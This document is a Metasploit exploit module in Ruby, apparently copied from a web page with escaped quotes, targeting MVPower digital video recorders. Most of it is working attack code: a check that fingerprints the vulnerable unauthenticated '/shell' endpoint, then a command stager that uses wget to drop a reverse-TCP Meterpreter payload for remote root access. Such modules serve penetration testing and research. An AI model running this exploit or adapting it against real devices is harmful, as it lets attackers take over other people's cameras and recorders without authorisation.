# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  HttpFingerprint = { :pattern => [ /JAWS\/1\.0/ ] }

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;MVPower DVR Shell Unauthenticated Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated remote command execution
        vulnerability in MVPower digital video recorders. The &#039;shell&#039; file
        on the web interface executes arbitrary operating system commands in
        the query string.

        This module was tested successfully on a MVPower model TV-7104HE with
        firmware version 1.8.4 115215B9 (Build 2014/11/17).

        The TV-7108HE model is also reportedly affected, but untested.
      },
      &#039;Author&#039;      =>
        [
          &#039;Paul Davies (UHF-Satcom)&#039;, # Initial vulnerability discovery and PoC
          &#039;Andrew Tierney (Pen Test Partners)&#039;, # Independent vulnerability discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;Platform&#039;    => &#039;linux&#039;,
      &#039;References&#039;  =>
        [
          # Comment from Paul Davies contains probably the first published PoC
          [ &#039;URL&#039;, &#039;https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/&#039; ],
          # Writeup with PoC by Andrew Tierney from Pen Test Partners
          [ &#039;URL&#039;, &#039;https://www.pentestpartners.com/blog/pwning-cctv-cameras/&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 23 2015&#039;,
      &#039;Privileged&#039;     => true, # BusyBox
      &#039;Arch&#039;           => ARCH_ARMLE,
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039; => &#039;linux/armle/mettle_reverse_tcp&#039;,
          &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;CmdStagerFlavor&#039; => %w{ echo printf wget },
      &#039;DefaultTarget&#039;   => 0))
  end

  def check
    begin
      fingerprint = Rex::Text::rand_text_alpha(rand(10) + 6)
      res = send_request_cgi(
        &#039;uri&#039; => "/shell?echo+#{fingerprint}",
        &#039;headers&#039; => { &#039;Connection&#039; => &#039;Keep-Alive&#039; }
      )
      if res && res.body.include?(fingerprint)
        return CheckCode::Vulnerable
      end
    rescue ::Rex::ConnectionError
      return CheckCode::Unknown
    end
    CheckCode::Safe
  end

  def execute_command(cmd, opts)
    begin
      send_request_cgi(
        &#039;uri&#039; => "/shell?#{Rex::Text.uri_encode(cmd, &#039;hex-all&#039;)}",
        &#039;headers&#039; => { &#039;Connection&#039; => &#039;Keep-Alive&#039; }
      )
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def exploit
    print_status("#{peer} - Connecting to target")

    unless check == CheckCode::Vulnerable
      fail_with(Failure::Unknown, "#{peer} - Target is not vulnerable")
    end

    print_good("#{peer} - Target is vulnerable!")

    execute_cmdstager(linemax: 1500)
  end
end

